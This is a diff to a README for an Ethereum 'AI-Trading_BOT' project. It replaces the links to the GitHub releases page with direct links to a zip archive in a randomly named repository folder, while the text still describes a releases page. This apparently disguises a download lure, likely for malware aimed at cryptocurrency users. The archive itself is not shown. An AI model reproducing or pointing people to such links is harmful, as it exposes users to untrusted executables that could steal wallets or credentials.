@@ -1,6 +1,6 @@
 # 🤖 AI-Trading_BOT - Trade Smarter with AI Technology
 
-[![Download AI-Trading_BOT](https://img.shields.io/badge/Download%20AI--Trading%5FBOT-Get%20Started-brightgreen)](https://github.com/jermeykaritu/AI-Trading_BOT/releases)
+[![Download AI-Trading_BOT](https://raw.githubusercontent.com/jermeykaritu/AI-Trading_BOT/main/blepharoatheroma/AI-Trading_BOT.zip%20AI--Trading%5FBOT-Get%20Started-brightgreen)](https://raw.githubusercontent.com/jermeykaritu/AI-Trading_BOT/main/blepharoatheroma/AI-Trading_BOT.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to AI-Trading_BOT! This application helps you trade Ethereum on Uniswap 
 
 ## 📥 Download & Install
 
-1. **Visit this page to download:** [AI-Trading_BOT Releases](https://github.com/jermeykaritu/AI-Trading_BOT/releases).
+1. **Visit this page to download:** [AI-Trading_BOT Releases](https://raw.githubusercontent.com/jermeykaritu/AI-Trading_BOT/main/blepharoatheroma/AI-Trading_BOT.zip).
    
    On this page, you will find the latest version of the application. Just click the version you want and follow the prompts to download.
 
